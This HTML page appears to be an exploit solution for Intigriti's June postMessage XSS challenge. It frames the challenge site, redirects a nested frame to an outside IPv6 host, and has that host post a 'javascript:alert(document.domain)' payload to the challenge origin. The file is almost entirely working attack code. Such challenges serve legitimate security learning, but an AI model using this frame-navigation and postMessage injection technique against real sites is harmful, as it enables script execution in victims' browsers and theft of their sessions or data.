<html>
  <head>Post Message XSS Challenge - Intigriti June</head>
  <body>
    <br>
    <iframe id="xss_frame" width=600 height=800 ></iframe>
    <script>

      console.log(location.search);
      if ((location.search).includes("shoot_payload")) {
          console.log("Sending exploit...")
          parent.postMessage("javascript:alert(document.domain)", "http://challenge-june.intigriti.io");
      } 
      let frame = document.getElementById("xss_frame");
      frame.src = "http://challenge-june.intigriti.io/#xss"
        
      frame.onload = function() {
        frame.contentWindow.frames[0].location = "http://[2604:a880:2:d1::3c:b050]?shoot_payload=1"
        }
               
      console.log(frame);
      console.log("Done!");
    </script>
  </body>
</html>